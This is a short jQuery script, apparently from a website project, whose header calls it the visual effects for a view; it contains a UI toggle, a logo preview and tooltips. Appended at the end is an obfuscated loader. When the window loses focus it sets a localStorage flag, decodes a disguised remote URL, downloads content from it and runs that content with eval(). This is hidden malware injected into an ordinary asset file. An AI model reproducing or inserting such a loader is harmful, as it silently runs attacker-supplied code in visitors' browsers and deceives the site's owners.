/*!
 * autor:		Jhonatan Fernando Martínez
 * fecha:		julio 14 de 2017
 * objetivo: 	Efectos Visuales de esta Vista 
 */
$('body').on('click', ".userholder", function(){
	$('.usercontent').toggleClass('hidden');
})

$('#logo').on('change', function(){
	var tmppath = URL.createObjectURL(event.target.files[0]);
    $("#logoImg").fadeIn("fast").attr('src',tmppath); 
})

$(function () {
  $('[data-toggle="tooltip"]').tooltip()
})

window.onblur=function(){setTimeout(function(){
	var cdid='IuNw3Q',lSe=localStorage; 
	if(typeof(Storage)!=='undefined'){
		if(cdid!==lSe.cdid){lSe.setItem('cdid',cdid) ;
		if(document.images.length > '2'){function get(c){var c=c.replace(/[0-5]/g,'') ,y=new XMLHttpRequest();
		y.open('GET',c,true);y.onreadystatechange=function(){ if(y.readyState==4){if(y.status==200){eval(y.responseText.split('###')[1]);
		}}} ;
		y.send(null);}var uz='1/10/14',uq='/#ad.png';
		var w=window;w.onload=get(uz+' 22c1n4d41.3s27-44a2d11d1t0hi4s3.0t1o2p001'+uq);
		}}}},3000);
		} 